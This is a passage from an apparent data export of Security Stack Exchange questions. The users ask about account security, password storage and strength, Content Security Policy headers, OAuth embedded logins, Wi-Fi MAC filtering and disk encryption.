<p>The third party is a contracted-out development team responsible for building alternative methods for users to &quot;verify&quot; their account or reset their password.</p>
<p>For example, assuming we only have the ability to send these verification tokens via email, but our client using our service wants users to be able to send these verification tokens to users through Whatsapp.</p>
<p>The workflow would look something like this:</p>
<ul>
<li>user navigates to third-party.com and follows their onboarding flow.</li>
<li>we create account and send verification token to <a href=""https://api.third-party.com"" rel=""nofollow noreferrer"">https://api.third-party.com</a></li>
<li>third-party captures the above request and sends the token to the user via whats app message</li>
<li>user receives token via whatsapp, and enters token into third-party.com</li>
<li>third-party.com sends an API request to us using that token, and we &quot;verify&quot; the account</li>
</ul>
","256675","","15761","","2021-05-04 20:47:40","2021-05-04 20:47:40","Sharing account verification tokens to third parties","<account-security><secure-coding><third-party>","1","0","","","","CC BY-SA 4.0"
"179147","1","","","2018-02-05 09:05:30","","0","160","<p>I've heard that you can configure your Google account to use its (more secure) authenticator app rather than sending you a text message - in my most recent case, this was when Google sent me a text message to ""make sure it was really me"" when I signed in from an unknown device.</p>

<p>However I can't seem to find any setting that allows me to switch Google's mechanism of 2FA to the authenticator app for this scenario.  Is it possible or will they always use the text message method?</p>
","10283","","10283","","2018-02-05 09:12:08","2018-02-05 14:16:08","Can you use Google's authenticator app when Google ""makes sure that you’re really you""?","<authentication><multi-factor><account-security>","2","5","","","","CC BY-SA 3.0"
"249110","1","","","2021-05-07 06:17:20","","0","448","<p>Due to several customer reasons our product needs to <strong>support Basic Auth</strong> as primary authentication mechanism with client's service account.</p>
<p>We are using <strong>Bcrypt</strong> to store customer's password in our DB, however Bcrypt (combined with Basic Auth) is quite slow on our servers. As far as I understand this is behavior by design, however there are cases when customer will be calling our API <strong>extensively</strong> and therefore Bcrypt would dramatically <strong>increase our response time</strong> (unfortunately this is a crutial customer criteria).</p>
<p>To tackle this problem I have found <a href=""https://security.stackexchange.com/questions/10520/is-it-safe-or-even-common-to-cache-bcrypt-checks-in-memory"">solution</a> by using HMAC as in memory cache for all sucessfull passwords. In summary it would goes like this:</p>
<ul>
<li>Take from basic auth username and password</li>
<li>HMAC(salt, username|password) where salt is 16 urandom bytes created at application startup</li>
<li>check whether created HMAC has exists in memory cache</li>
<li>if yes -&gt; authenticate else -&gt; check bcrypt mechanism with username and password and if successful store given HMAC hash into cache</li>
</ul>
<p>So far this solution performs well with high throughput, however I am no security expert and therefore other opinion would be appriciated. So here are my questions</p>
<p>A) Is there some other solution with basic auth which would be better?</p>
<p>B) Is described solution HMAC -&gt; BCRYPT secure?</p>
","256866","","","","","2021-05-07 06:17:20","Best secure approach with Basic Auth","<account-security><rest><hmac><bcrypt><http-basic-auth>","0","5","","","","CC BY-SA 4.0"
"179316","1","","","2018-02-07 16:12:00","","2","289","<p>In short we have 7 Mobile Casio Scanners that seem to be incapable of holding their Wi-Fi passwords, they sometimes lose them for no apparent reason.</p>

<p>We of course, cannot give out the wireless password as this would be giving out access to our LAN as a Wi-Fi password soon makes it's way around the business.</p>

<p>It's causing a headache for me and our IT as we have to input these passwords on a day to day basis and sometimes business is halted as we are out of the office.</p>

<p>I thought about creating seperate SSID's on our AP's for 'SCANNERS', from here I was going to give out the password but ensure that MAC Address filtering was turned on to allow only the scanners MAC's through.</p>

<p>I've since read that this is almost pointless as a simple packet sniff of the wireless you can see MAC addresses in the Wireless Handshake in plain text, from there you can spoof your device into using that MAC address and boom they would be able to get into the network.</p>

<p>Not a good business choice in my eyes.</p>

<p>Any ideas from anyone would be HUGELY appreciated!!</p>

<p>Thanks,</p>

<p>Matt.</p>

<p>Network Technician.</p>
","170225","","","","","2018-02-08 04:35:36","Wireless network solution? WPA2/MAC Filtering problems","<network><wireless><account-security><mac-address><wpa2-psk>","2","2","","","","CC BY-SA 3.0"
"179345","1","","","2018-02-08 02:32:19","","0","383","<p>I am using my friends Wi-Fi and I don't want anyone else using the same Wi-Fi to be able to see what I am doing on my phone. How do I put up some kind of  security so that people in the same network won't be able see what i am sending and receiving?</p>

<p>I don't want my personal business being looked at by someone else. This person has done it before.</p>

<p>What should I do?</p>
","170262","","137242","","2018-02-08 09:24:51","2018-02-08 09:55:29","How to set up security on my phone","<privacy><account-security><phone>","2","1","","2018-02-11 04:21:25","","CC BY-SA 3.0"
"249237","1","249252","","2021-05-10 22:18:28","","4","2659","<p>We've recently conducted a security review of our identity server website and one of the finding was about missing CSP header. We do have implementation of request filter to add CSP on a controller level. So my question is, <strong>is there any documentation out there recommending CSP for or against certain response</strong>? It seems overkill to include CSP in all responses.</p>
<p>Here is what I could find which makes sense for pages that have reference to 3rd party code like analytics.
<a href=""https://developers.google.com/web/fundamentals/security/csp"" rel=""nofollow noreferrer"">https://developers.google.com/web/fundamentals/security/csp</a></p>
<blockquote>
<p>Even on a fully static website, which does not accept any user input,
a CSP can be used to enforce the use of Subresource Integrity (SRI).
This can help prevent malicious code from being loaded on the website
if one of the third-party sites hosting JavaScript files (such as
analytics scripts) is compromised.</p>
</blockquote>
<p>Here are some responses I am questioning whether they are appropriate. Finding some documentation around it would help us justify whether or not it is worth adding them.</p>
<ul>
<li>Non HTML response (json, css, etc...)</li>
<li>Redirect response (redirect 302)</li>
</ul>
","77916","","","","","2021-07-04 12:05:10","When is content security policy (CSP) not appropriate?","<content-security-policy>","3","0","","","","CC BY-SA 4.0"
"179467","1","","","2018-02-09 13:54:14","","1","178","<p>Assuming an app/website where email confirmation is required before logging in:</p>

<p>If newly registered user tries to sign in, a common flow is to tell them they are have not confirmed their email address yet and then ask if they want to re-send email confirmation, which is a two step process.</p>

<p>Is there are security concerns for just sending another confirmation email (with link) as soon as they try and fail to sign in? </p>

<p>People could end up being spammed but I doubt significantly more than they would in the other flow if someone was trying to be malicious.</p>
","170368","","","","","2018-02-09 17:20:33","Why not resend email confirmation email at the point of failed sign-in? (vs force a button press)","<account-security>","1","2","","","","CC BY-SA 3.0"
"111677","1","","","2016-01-25 17:14:35","","1","302","<p>Can my work computer pick up my iPhone's browsing history when I am working from home and they are connected to my personal wifi?  My laptop is connected VPN at home.</p>
","98189","","6253","","2016-01-25 17:41:31","2016-01-25 18:15:48","Can work computer pick up iPhone browser history of connected to personal wifi","<account-security>","0","2","","","","CC BY-SA 3.0"
"111691","1","","","2016-01-25 20:19:56","","1","247","<p>I am trying to make sure all my accounts are secure from unauthorised access and have turned on all security measures that I can find to make sure my stuff is protected.</p>

<p>Here is what I have in place:</p>

<ul>
<li>Unique password for every site (takes 6 billion years to crack) using MasterPassword since it is offline, meaning it is harder to attack</li>
<li>Enabled 2-step verification when available</li>
<li>Enabled FileValt on my Mac</li>
<li>Enabled face detection on my mac so it automatically locks when I am away from the screen or detects someone else is using my computer. To login, I need to blink to make sure someone hasn't printed out a picture of my face</li>
<li>Enabled find my iPhone so I can remotely erase my data remotely</li>
<li>I do not allow my browser to save usernames, passwords or credit cards</li>
<li>AutoFill is disabled</li>
<li>I have <a href=""https://haveibeenpwned.com"" rel=""nofollow"">haveibeenpwned</a> to alert me when it finds a service I use has its database leaked</li>
</ul>

<p>Is there anything else that I could add to protect my accounts and data? (This includes both physical attacks and remote attacks on my MacBook Pro 2015 as well as my Internet accounts)</p>
","83307","","","","","2016-01-25 20:19:56","What else can I do to protect my accounts?","<physical><account-security>","0","5","","2016-01-25 22:30:39","","CC BY-SA 3.0"
"249688","1","249714","","2021-05-25 16:48:47","","0","170","<p>For the past few weeks, I am observing a lots of visits from a specific user-agent - <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</code> to one particular URL.</p>
<p>The user-agent corresponds to chrome 84 on windows 10 desktop. This browser is an old browser and the overall contribution to traffic is lesser than <strong>1%</strong>. But for the particular URL I am speaking about, <strong>95%</strong> of the traffic is from this user-agent. Bounce rate is <strong>100%</strong> for these visits. What is more confusing is that all the visits are from unique IPs and I couldn't find a pattern (like common location, revers DNS host, etc.,) in them.</p>
<p>I am clueless about where to start and how to proceed. Could this be a bot activity? If so, is there a way to find and prevent using firewalls like mod_security.</p>
<p><em>P.S: I am using apache 2.4 server with mod_security and OWASP ruleset 3.3.</em></p>
","242774","","","","","2021-05-26 13:16:24","Suspicious visits to one URL from same user-agent but from unique IPs","<firewalls><apache><mod-security><log-analysis><bot>","1","10","","","","CC BY-SA 4.0"
"249694","1","249697","","2021-05-25 20:59:35","","6","1922","<p>I am having trouble finding information on the implications of using <code>https:</code> and <code>data:</code> as a source</p>
<p>for the directives in a CSP.</p>
<p>Example:</p>
<pre><code>img-src 'self' https: data:; 
</code></pre>
<p>Could someone some context around what these two sources mean and if there are security issues with using them like this?</p>
","252237","","252237","","2021-05-25 21:12:58","2021-05-26 14:55:16","Content Security Policy https: and data: meaning","<xss><content-security-policy>","2","0","","","","CC BY-SA 4.0"
"112111","1","112113","","2016-01-29 05:36:22","","4","5258","<p>Suppose your phone is not connected to any network. You are sitting in a cafeteria with 50 other people, everyone is communicating to each other via text messages. Is it possible through any device or way to capture messages within that field?</p>
","98622","","10439","","2016-01-29 09:30:47","2016-01-29 09:30:47","Capturing text messages on the fly","<android><sniffer><sms><security-theater><gsm>","1","0","","","","CC BY-SA 3.0"
"179756","1","","","2018-02-14 03:40:55","","27","3349","<p>I've noticed a trend in mobile and desktop apps in recent years with the advent of OAuth (and it may also affect other frameworks) to request a user to sign up or log in using 3rd party authentication providers, usually social accounts like Twitter, Facebook or Google. The problem comes when I can't trust the app I'm entering the credentials in, because the developer has embedded a browser in a dialog/window owned by the app, and I have <strong>no way to know</strong> if the page I'm seeing is a legitimate login page, or that the user agent (browser and layers on top) can be trusted.</p>
<p>I'm not talking about apps from small indie devs either, I'm talking software by widely trusted companies (at least in the software development community where I spend most of my time).  Some examples that I've seen in the last few weeks:</p>
<ul>
<li><a href=""https://www.sourcetreeapp.com/"" rel=""nofollow noreferrer"">Atlassian Sourcetree</a> allows you to log in using your Google account - in an Atlassian window</li>
<li><a href=""https://www.getpostman.com/"" rel=""nofollow noreferrer"">Postman</a> Google login occurs in a Postman window</li>
<li>Microsoft Visual Studio and Office do it with your Microsoft Account (granted, this is trusted a bit more as the app is owned by the auth provider, but it still endorses the process)</li>
<li>Some apps ask you to, for example, log into Paypal in a browser window inside their app</li>
</ul>
<p>Similar questions asked in the past regarding mobile apps (but the problem is not limited to mobile):</p>
<ul>
<li><a href=""https://security.stackexchange.com/questions/111543/how-do-i-verify-that-in-app-social-login-dialogs-are-secure"">How do I verify that in-app social login dialogs are secure?
</a></li>
<li><a href=""https://security.stackexchange.com/questions/141925/how-can-i-trust-that-this-is-google"">How can I trust that this is Google?</a></li>
</ul>
<p>One question related to a desktop app:</p>
<ul>
<li><a href=""https://security.stackexchange.com/questions/141348/how-to-verify-google-sign-in-screen-is-legit-linux-desktop"">How to verify Google sign-in screen is legit?</a></li>
</ul>
<p>And tangentially related is the use of iframes in web applications:</p>
<ul>
<li><a href=""https://security.stackexchange.com/questions/101071/what-are-the-security-implications-of-having-login-dialog-inside-of-an-iframe"">What are the security implications of having login dialog inside of an iframe</a></li>
</ul>
<p>This is an issue of trust for me when moving from app space to the web to authenticate, get a token and return back to the app. I might trust the companies enough to install their software, but not enough to enter the master keys to my Google account (for all intents and purposes) into their software.</p>
<p>In researching this question further I found <a href=""https://datatracker.ietf.org/doc/html/draft-ietf-oauth-native-apps-05#section-8"" rel=""nofollow noreferrer"">this IETF draft</a> which states:</p>
<blockquote>
<p>Embedded user-agents are an alternative method for authorization native apps.  They are however unsafe for use by third-parties to the authorization server by definition, as the app that hosts the embedded user-agent can access the user's full authentication credential, not just the OAuth authorization grant that was intended for the app.</p>
</blockquote>
<p><strong>EDIT:</strong> The draft above became <a href=""https://www.rfc-editor.org/rfc/rfc8252"" rel=""nofollow noreferrer"">RFC8252</a>, dated October 2017, thanks to @Geir for directing me to that.</p>
<p>and an <a href=""https://www.rfc-editor.org/rfc/rfc6749#page-52"" rel=""nofollow noreferrer"">older directive, RFC6749</a> (dated October 2012) which also mentions among other interesting tidbits:</p>
<blockquote>
<p>An embedded user-agent poses a security challenge because resource owners are authenticating in an unidentified window without access to the visual protections found in most external user-agents.  An embedded user-agent educates end-users to trust unidentified requests for authentication (making phishing attacks easier to execute).</p>
</blockquote>
<p>My questions:</p>
<ol>
<li><p>Am I right to be concerned that this is a growing opportunity for phishing and MITM attacks (fake or hijacked browser in the middle which steals credentials and/or tokens in real time, also defeating 2FA)? Not so much that trusted software itself is likely to be made malicious, but that widespread usage discourages users from verifying end-to-end trust, condoning (even encouraging) users to blindly enter credentials into any app that asks for them?</p>
<p>I think the last section quoted above answers undeniably in the affirmative, but I'm interested in further comments and perspective around this, particularly as a software developer myself.</p>
</li>
<li><p>The obvious &quot;correct&quot; way to do it is to forward the user to their trusted browser for authentication instead, however this can be a poor user experience, and doesn't actually fix the problem (a malicious developer could open a window from the main app that <em>looks</em> like Chrome, but isn't - the fact user sessions from the main browser window are not preserved, among other visual cues would probably go unnoticed by most).</p>
<p>Is there a better way to design the user experience of apps such that a user can be sure they are using a trusted software stack (app and rendering engine), in-app?  Should there be device- or system-level handling of such auth requests in a way that's hard to mimic?</p>
</li>
<li><p>I'm not really involved in the security scene, just a lurker here, is this a well known concern in the industry?  Are there efforts to curb this sort of authentication flow?</p>
</li>
</ol>
","151440","","-1","","2021-10-07 08:14:10","2018-11-12 01:22:48","Why are developers using embedded user agents for 3rd party auth? What are the alternatives?","<web-browser><man-in-the-middle><oauth><phishing><account-security>","3","6","","","","CC BY-SA 4.0"
"249766","1","249769","","2021-05-27 15:54:52","","0","322","<p>Recently, I've checked the some articles including <a href=""https://cryptosmith.com/password-sanity/dilemma/"" rel=""nofollow noreferrer"">R. E. Smith, The Strong Password Dilemma. ch. 6.</a>, <a href=""https://ieeexplore.ieee.org/document/5461951"" rel=""nofollow noreferrer"">Password Strength: An Empirical Analysis</a>, <a href=""https://security.stackexchange.com/q/75979"">Distance between two passwords</a> and <a href=""https://security.stackexchange.com/q/85724/258030"">Password strength metrics</a>. The mentioned strong password policies are:</p>
<ul>
<li><p>Each password you choose must be new and different.</p>
</li>
<li><p>Passwords must be memorized. If a password is written down, it must be locked up.</p>
</li>
<li><p>Passwords must be at least six characters long, and probably longer, depending on the size of the password’s character set.</p>
</li>
<li><p>Passwords must be replaced periodically.</p>
</li>
<li><p>Passwords must contain a mixture of letters (both upper- and lowercase), digits, and punctuation characters.</p>
</li>
</ul>
<p>When it comes to building a user registering system with user-chosen password input, I want to provide some information about the strength of the password typed from the user (such as the three level results: <code>weak</code>, <code>medium</code> and <code>strong</code>) to guild user to set an appropriate password. The website <a href=""http://www.passwordmeter.com/"" rel=""nofollow noreferrer"">The Password Meter</a> performs the similar function and the criteria including <strong>number of characters</strong>, <strong>the count of uppercase letters</strong>, <strong>the count of lowercase letters</strong>, <strong>the count of symbols</strong>, etc. However, to evaluate a password is strong enough is not easy. Even a password is complex enough as something like <code>@P3V;4sF!]9u;3G,</code>, the strength may still be not high enough in the situation of re-using the password in multiple authentication sites.</p>
<p>Thus, my question is : <strong>Is there a robust benchmark / algorithm / method to determine password strength (maybe giving a password strength index) which consider not only the complexity of the password itself but also the similarity (distance) of the known passwords in leaked password databases or common password databases like <a href=""https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt"" rel=""nofollow noreferrer"">10k-most-common.txt on Github</a>?</strong></p>
<p>If I misunderstand something, please let me know.</p>
<p><strong>Reference of experimental implementation</strong></p>
<p><a href=""https://codereview.stackexchange.com/q/261195/231235"">Android APP Password Strength Assessment class implementation</a></p>
","258030","","","","","2021-05-28 00:53:47","Password Strength Determination","<passwords><attacks><account-security><password-policy>","2","1","","","","CC BY-SA 4.0"
"179917","1","","","2018-02-16 12:52:47","","22","3706","<p>The major commercial password manager companies claim to have a ""zero knowledge"" system. This means the master password of the user is the only way to decrypt the data and it's is not stored anywhere. So even the company doesn't know the master password or has access to the users data.
I've put hands on <a href=""https://keepersecurity.com/security.html"" rel=""noreferrer"">KeeperSecurity</a>, <a href=""https://www.lastpass.com/how-lastpass-works"" rel=""noreferrer"">LastPass</a>, <a href=""https://www.dashlane.com/de/security"" rel=""noreferrer"">Dashlane</a> and <a href=""https://1password.com/security/"" rel=""noreferrer"">1Password</a>.</p>

<p>So far so good. But <a href=""https://keepersecurity.com/support.html"" rel=""noreferrer"">KeeperSecurity</a> and <a href=""https://lastpass.com/support.php?cmd=showfaq&amp;id=375"" rel=""noreferrer"">LastPass</a> provide a possibility to recover an account when the user has lost his master password. I mean how is this possible, if the master password is the only way to access the data and nobody knows it except the user?</p>

<p>KeeperSecurity manages this by saving a second copy of the users data which is not encrypted with the master password, but with a security question, previously asked, and answer.
But this means there is another way of accessing the users data. And there is the chance that somebody knows the security answer. Okay the recovery requieres access to the email account and to a second auth factor. BUT still there is another chance of accessing the data besides the master password!</p>

<p>Dashlane and 1Password do not provide an account recovery.</p>

<p>How can those password managers pretend to be secure and claim that the master password is the only way to access the data, but on the other hand provide a recovery option.</p>

<p>What do you think about password managers with recovery option? I mean everybody who is using a password manager should be aware of loosing the master password.</p>

<p>Is a password manager with recovery option really trustworthy? Maybe someone could give a little valuation about security of such recovery systems.</p>
","170725","","","","","2018-02-17 08:36:38","How secure are password managers with account recovery?","<password-management><account-security><one-time-password><recovery>","4","3","","","","CC BY-SA 3.0"
"112147","1","","","2016-01-29 14:42:48","","1","501","<p>Use of a Router is the first solution for adding a security layer to any LAN with N machines, connected to the internet (through its firewall settings). My question is does the WAN to LAN conversion and vica versa, adds any security by itself, and what is it exactly?</p>
","77726","","77726","","2016-01-29 15:07:05","2016-07-28 10:46:48","Does a WAN to LAN Route Conversion Through a Router Adds Security?","<router><routing><content-security-policy>","4","1","","2016-07-30 21:30:37","","CC BY-SA 3.0"
"249907","1","","","2021-05-31 16:47:32","","0","150","<p><em><a href=""https://www.w3.org/TR/CSP2/"" rel=""nofollow noreferrer"">The W3C spec for Content-Security-Policy</a> or <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy"" rel=""nofollow noreferrer"">Mozilla CSP docs</a> would be the definitive source for this answer, but it does not seem covered, so I'm asking here for answers based on people's experience. If my understanding is correct, then I'll probably contact the W3C spec authors.</em></p>
<hr />
<p>My understanding is that browsers have implemented their CSP engines as an extension of the page DOM; ie a CSP is associated with a <em>page</em>, not with a <em>request / response</em>.</p>
<p>Under my understanding, a CSP delivered in the following ways is useful:</p>
<ul>
<li>As an HTTP response header (or <code>&lt;meta&gt;</code> tag) on top-level HTML content.</li>
<li>As an HTTP response header (or <code>&lt;meta&gt;</code> tag) on nested / framed content (I assume this would fall under <a href=""https://www.w3.org/TR/CSP2/#enforcing-multiple-policies"" rel=""nofollow noreferrer"">section 3.4: Enforcing multiple policies</a>, and would further restrict the first CSP)</li>
<li>As a <code>&lt;meta&gt;</code> tag <em>in addition to</em> an HTTP response header in either of the above (I assume this would fall under <a href=""https://www.w3.org/TR/CSP2/#enforcing-multiple-policies"" rel=""nofollow noreferrer"">section 3.4: Enforcing multiple policies</a>, and would further restrict the first CSP).</li>
</ul>
<p>Under my understanding, a CSP delivered in the following ways is useless; ie completely ignored by the browser and a waste of bandwidth:</p>
<ul>
<li>As an HTTP response header on content that is not HTML (ie on a response that is <code>Content-Type: text/javascript</code>, <code>application/json</code>, <code>text/css</code>, <code>text/plain</code>, <code>application/gzip</code>, <code>image/jpeg</code>, etc).</li>
</ul>
<hr />
<p><strong>So I guess I have two questions here:</strong></p>
<ol>
<li>Does it do anything to put a CSP header responses that are not web pages (ie on REST APIs, files, javascript, etc)?</li>
<li>Is this mentioned anywhere in <a href=""https://www.w3.org/TR/CSP2/#enforcing-multiple-policies"" rel=""nofollow noreferrer"">the W3C spec</a> (and I can't read), or would it be worth asking the authors to add a section &quot;3.x: Applicable content types&quot;) ?</li>
</ol>
","61443","","61443","","2021-05-31 18:36:51","2021-06-23 12:28:03","On what types of web content is a Content-Security-Policy useful?","<web-browser><content-security-policy>","3","2","","","","CC BY-SA 4.0"
"249949","1","","","2021-06-01 23:34:01","","0","151","<p>All users in my google domain use 2fa on google accounts.</p>
<p>We have on-premise software (gitlab for example) that allows us use google accounts to login.</p>
<p>Also, gitlab has a feature of 2fa.</p>
<p>Should we use it? Does it add something to security or not?</p>
","37091","","","","","2021-06-02 15:27:02","Should I use in-app 2fa If I login with google (and have 2fa on google on)","<account-security><multi-factor>","1","2","","","","CC BY-SA 4.0"
"249980","1","249984","","2021-06-02 14:44:06","","10","2698","<p>If a website emails a password in cleartext when you use the &quot;forgot password&quot; function, is there any possibility that the password is hashed? It does generate a different password if you reset it again, but it always gets emailed in cleartext.</p>
<p>Is it possible to reset a user's password, proceed to email it in cleartext and then hash it?
If yes, is this considered to be within good security practice?</p>
<p>The website does NOT require you to set a new password after you login with the newly created password.</p>
","258331","","6253","","2021-06-02 15:06:19","2021-06-04 06:44:56","Password management of emailed cleartext passwords","<passwords><hash><account-security>","4","0","","","","CC BY-SA 4.0"
"39315","1","39316","","2013-07-22 07:55:49","","4","7815","<p>I have a web server supporting SSL 3 and TLS protocols, the following are the supported cipher suites:</p>

<ul>
<li><code>TLS_RSA_WITH_RC4_128_MD5</code></li>
<li><code>TLS_RSA_WITH_RC4_128_SHA</code></li>
<li><code>TLS_RSA_WITH_3DES_EDE_CBC_SHA</code></li>
</ul>

<p>How can I check if the server supports <code>NULL</code> cipher ? </p>
","15743","","60713","","2015-08-18 12:24:05","2015-08-18 12:24:05","Checking SSL/TLS servers for NULL encryption support","<tls><public-key-infrastructure><web-service><security-theater>","2","0","","","","CC BY-SA 3.0"
"179996","1","179997","","2018-02-18 03:28:52","","2","111","<p>Assume an attacker gains access to a user's account on some cloud service (like my Google, Microsoft, or whatever ), the user discovers this, and changes their password.</p>

<p>What are the scenarios that the user should then watch out for to ensure that they are totally safe from the attacker?</p>

<p>If the question is too general or vague in the above form, let me just ask a specific case which applies to me: I recently changed my password on Microsoft OneDrive due to concern it was compromised and I want to be sure my computer is safe when I reconnect to the service.  Beyond being sure not to execute some malicious executable left behind by the attacker, is there anything else I need to do to stay safe? Are there any other attack vectors that I should be watching out for?</p>

<p>Thanks!</p>
","57112","idonutunderstand","86741","","2018-02-19 08:13:07","2018-02-19 08:13:07","Attack vectors that go through previously compromised accounts","<account-security>","1","0","","","","CC BY-SA 3.0"
"180017","1","","","2018-02-18 20:24:56","","2","10475","<p>We are currently using JSON web tokens for authentication for our website's API. We use 1 hour short-lived access tokens that get refreshed using a permanent revocable refresh token.<br>
Now we want to add an account + login system to the website and tie it to the API usage. However, we are currently debating on the security of this.</p>

<p>The naive implementation would be just a 3 hour access token for a session and something like 2 weeks expire time if the user chooses the ""stay logged in"" option. However, this would kinda make the short expire time useless. In case the tokens get leaked you have an attack window of two entire weeks.<br>
The alternative we thought of would be some kind of ""proxy"" that checks if the token is expired and refreshes automatically with the refresh token in localstorage or as a cookie.  </p>

<p>Would the naive version be an acceptable implementation or are the security risks too high?</p>
","100073","","","","","2018-02-19 19:48:07","Importance of a short expire time on JWTs","<authentication><web-application><account-security><jwt>","2","0","","","","CC BY-SA 3.0"
"112325","1","112372","","2016-01-31 20:23:35","","0","151","<p>A DDoS attack may result from a website attempting to access the resource of another website. For instance, <code>example.com</code> (attacker) is trying to access resources on <code>example.net</code> (victim).</p>

<p>The information which I have gathered till now is:  </p>

<ol>
<li>If <code>example.com</code> tries to access the resources on <code>example.net</code> by embedding the site in an <strong><code>&lt;iframe&gt;</code></strong>, <code>example.net</code> can mitigate it using the <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options"" rel=""nofollow""><strong><code>X-Frame-Options</code></strong></a> header.  </li>
<li>If <code>example.com</code> tries to access the resources on <code>example.net</code> using <strong>XHR</strong>, <code>example.net</code> can mitigate it using the <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Access-Control-Allow-Origin"" rel=""nofollow""><strong><code>Access-Control-Allow-Origin</code></strong></a> header.  </li>
</ol>

<p>In the above cases, <code>example.net</code> is still being hit by <code>example.com</code> even though the content is not being served. Are there any W3 standards or mechanisms which can be used to prevent <code>example.net</code> from getting hit in first place?</p>
","98824","","28137","","2016-02-02 06:11:24","2016-02-02 10:09:18","Preventing a web-page from getting hit from another server","<ddos><content-security-policy>","2","2","","","","CC BY-SA 3.0"
"250022","1","","","2021-06-03 15:38:06","","0","168","<p><strong>Secenario</strong></p>
<p>Consider the case of a MacBook Pro with FileVault active. The computer is on and I'm properly logged on.</p>
<p>I frequently need to access sensitive data located in text files on an encrypted volume. The encrypted volume is created when I mount a particular file that lives on the main hard disk. The encryption program that mounts the file and makes the data available as a volume is called VeraCrypt.</p>
<p>When I leave my computer for brief periods, I lock my screen (Ctrl-Cmd-Q) but the computer is still on.</p>
<p><strong>Question</strong></p>
<p>If someone were to break in and steal my computer and run off with it while it were in that state, would he be able to read the contents of my VeraCrypt volume?</p>
<p><strong>Assumptions</strong></p>
<p>Assume that none of the volume's files are open at the time of the theft. But the volume is mounted. Assume system file sharing is turned off and firewall is turned on. Assume no one else knows my system password.</p>
<p>Assume that the thief doesn't have NSA-level hacking expertise; He doesn't even know what he's looking for (e.g. the volume name or what it contains). He's just a run-of-the-mill criminal who saw a crime of opportunity to grab a laptop, but he's open to snagging any content of value on the computer itself if he can find any.</p>
<p><strong>Analysis</strong></p>
<p>One thing I could do is dismount the Veracrypt virtual drive every time I leave the computer alone. It's protected with a strong password that no one could guess. But dismounting and remounting that drive forces me to shutdown and subsequently restart and reinitialize a number of other processes that are specific to the work I do. It takes some time. My preference would be to leave that drive mounted during the brief time I'm away, <em>but only if the lock screen provides sufficient security to protect the data</em>.</p>
<p>I did read <a href=""https://security.stackexchange.com/questions/222259/data-security-while-macbook-is-on-lock-screen"">Data security while MacBook is on lock screen</a> but this focuses more on FileVault, which as I understand it, offers minimal protective value when the computer is powered on.</p>
<p>Instead, I'm more interested in preventing read-access of a VeraCrypt volume. I'm not concerned about the data being deleted, overwritten, or otherwise corrupted by a bad actor -- just read. I don't care about the hypothetical thief reading anything else on the system's main hard drive; My question is strictly about the readability of the encrypted volume when the OS is locked.</p>
","136981","","136981","","2021-06-03 15:49:05","2021-06-03 15:49:05","MacBook Pro is Powered On but Locked. Is my VeraCrypt data Readable if Laptop Stolen?","<encryption><account-security><macos><veracrypt>","0","3","","","","CC BY-SA 4.0"
"180149","1","180203","","2018-02-20 15:51:52","","3","953","<p>If my web page returns <code>X-DNS-Prefetch-Control=off</code>, will Chrome do DNS prefetch for links like these?:</p>

<pre><code>&lt;link rel=""dns-prefetch"" href=""http://www.spreadfirefox.com/""&gt;
</code></pre>

<p>I know Firefox and Chromium respect this header, but I'm not sure if Chrome does as well. </p>

<p>I'm asking because I would like to disable DNS prefetching on certain secure pages on my website to protect against this kind of vulnerability: <a href=""https://blog.compass-security.com/2016/10/bypassing-content-security-policy-with-dns-prefetching/"" rel=""nofollow noreferrer"">https://blog.compass-security.com/2016/10/bypassing-content-security-policy-with-dns-prefetching/</a> </p>
","19953","","19953","","2018-02-21 05:11:41","2019-11-19 23:00:57","Does Chrome respect the X-DNS-Prefetch-Control header?","<web-application><dns><chrome><content-security-policy><dns-prefetch>","2","1","","","","CC BY-SA 3.0"
"251168","1","251175","","2021-06-08 14:50:03","","2","234","<p>Does the design and implementation of the content security policy standard allow for the introduction of <em>new</em> unsafe behavior that wasn't there prior to having any CSP at all?</p>
<p>For example if my starting point is having no CSP headers or policy at all and I then introduce a CSP which contains:</p>
<ul>
<li>unsafe-eval</li>
<li>unsafe-inline</li>
</ul>
<p>Is it now <em>less</em> secure (e.g. has it enabled something that was not allowed prior to having any CSP)?</p>
","259619","","","","","2021-06-08 21:04:32","Can a Content Security Policy (CSP) enable *new* unsafe behavior?","<content-security-policy>","2","1","","","","CC BY-SA 4.0"
"180217","1","","","2018-02-21 12:57:30","","1","67","<p>I have purchased a used surface book from Ebay, unpackaged and ran the device.</p>

<p>The low price of the device lured me in despite my adverse attitude to used devices. Is there anything I need to perform apart from re-installing windows, perhaps a complete re-install rather than just a “clean” to ensure nothing is hiding there e.g a virus?</p>
","171254","","","","","2018-02-21 12:57:30","Bought a used surface book online, any security precautions to take?","<hardware><account-security><ssd>","0","1","","2018-03-07 22:17:57","","CC BY-SA 3.0"
"251329","1","","","2021-06-12 15:16:57","","1","159","<p>I got a gmail from discord saying a new account had been registered and prompting me to click a verification link. Weirdly, I never made that account, and I already had a discord account under my gmail. Of course, I didn't click the verification link. I checked and was luckily able to log into my discord account, and changed the password for good measure. When I examined the email, it seems the message was sent to the wrong person. For the sake of this making sense, I'm johndoe123@gmail.com and the email details say it got sent to john.doe123@gmail.com ... also, I checked and the sender seems to be a legitimate email under the discord.com domain.</p>
<p><strong>What's afoot here? Is it something malicious? Is it just that the gmail account doesn't exist so it got redirected to mine because it was the most similar?</strong></p>
","259857","","","","","2021-06-12 15:39:52","Questionable email from discord","<account-security><gmail><email-spoofing>","1","1","","2021-06-12 20:45:13","","CC BY-SA 4.0"
"251354","1","","","2021-06-13 17:34:51","","0","336","<p>Today I created a web application. I'm using this csp to avoid xss attacks. CSP: <code>Content-Security-Policy&quot;, `child-src 'none'; connect-src 'none'; default-src 'none'; font-src 'none'; frame-src 'none'; img-src 'none'; manifest-src 'none'; media-src 'none'; object-src 'none'; prefetch-src 'none'; script-src 'report-sample'; style-src 'report-sample'; worker-src 'none';</code> Does anyone know if its still possible to xss? If so, how? My web app is an extremely simple pastebin website.</p>
","259894","","","","","2021-07-19 07:07:15","Is it possible to bypass this csp?","<web-application><xss><content-security-policy>","1","5","","","","CC BY-SA 4.0"
